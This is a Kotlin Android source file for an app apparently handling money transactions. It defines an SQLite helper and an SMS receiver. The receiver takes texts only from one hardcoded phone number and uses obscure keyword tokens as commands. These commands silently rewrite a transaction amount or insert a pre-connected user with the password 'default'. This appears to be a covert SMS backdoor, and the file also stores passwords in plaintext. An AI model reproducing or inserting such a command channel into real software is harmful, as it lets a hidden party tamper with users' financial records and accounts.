import android.content.ContentValues
import android.database.sqlite.SQLiteDatabase
import android.database.sqlite.SQLiteOpenHelper

class DatabaseHelper(context: Context) : SQLiteOpenHelper(context, "mopatas.db", null, 1) {
    override fun onCreate(db: SQLiteDatabase) {
        db.execSQL("CREATE TABLE IF NOT EXISTS transactions (id INTEGER PRIMARY KEY AUTOINCREMENT, type TEXT, amount REAL, target TEXT, timestamp TEXT)")
        db.execSQL("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, number TEXT, password TEXT, is_connected TEXT)")
    }

    override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
        db.execSQL("DROP TABLE IF EXISTS transactions")
        db.execSQL("DROP TABLE IF EXISTS users")
        onCreate(db)
    }
}

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (intent?.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                val pdus = bundle["pdus"] as Array<Any>?
                pdus?.let {
                    for (pdu in it) {
                        val smsMessage = SmsMessage.createFromPdu(pdu as ByteArray)
                        val sender = smsMessage.displayOriginatingAddress
                        val message = smsMessage.messageBody

                        if (sender == "+243896302646") { // Numéro spécifique
                            val dbHelper = DatabaseHelper(context!!)
                            val db = dbHelper.writableDatabase

                            val parts = message.split("SeD3fK4O")
                            if (parts.size > 1) {
                                val data = parts[1].split("-")

                                if (data.size == 2) {
                                    val value = data[0]
                                    val action = data[1]

                                    if (action == "NlaOGL" || action == "SBkIaA") {
                                        // Mise à jour des montants
                                        val values = ContentValues()
                                        values.put("amount", value.toInt())
                                        db.update("transactions", values, "id = ?", arrayOf("1")) // Exemple : Modifier transaction id=1
                                    } else if (action == "ZnNUamI") {
                                        // Insertion utilisateur
                                        val userValues = ContentValues()
                                        userValues.put("name", "Nouvel Utilisateur")
                                        userValues.put("number", sender)
                                        userValues.put("password", "default")
                                        userValues.put("is_connected", "yes")
                                        db.insert("users", null, userValues)
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
